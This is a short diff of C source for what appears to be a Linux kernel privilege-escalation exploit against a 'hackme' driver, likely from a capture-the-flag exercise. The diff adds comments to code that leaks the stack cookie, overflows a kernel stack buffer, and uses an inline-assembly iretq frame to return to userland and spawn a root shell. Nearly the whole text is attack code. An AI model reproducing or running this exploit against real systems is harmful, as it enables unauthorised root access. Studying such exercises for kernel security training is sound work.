@@ -97,7 +97,7 @@ void privesc(){
       "push r15;"
       "mov r15, user_cs;"
       "push r15;"
-      "mov r15, user_rip;"
+      "mov r15, user_rip;" // <- /bin/sh 
       "push r15;"
       "iretq;"
       ".att_syntax;"
@@ -117,9 +117,9 @@ void overflow(){
 }
 
 int main(void){
-  push_flags();
-  open_hackme();
-  leak();
-  overflow();
+  push_flags(); // safe all userland flags
+  open_hackme(); // open the driver to interact to it
+  leak(); // leak of stack cookie
+  overflow(); // run the shell code B)
   return 0;
 }
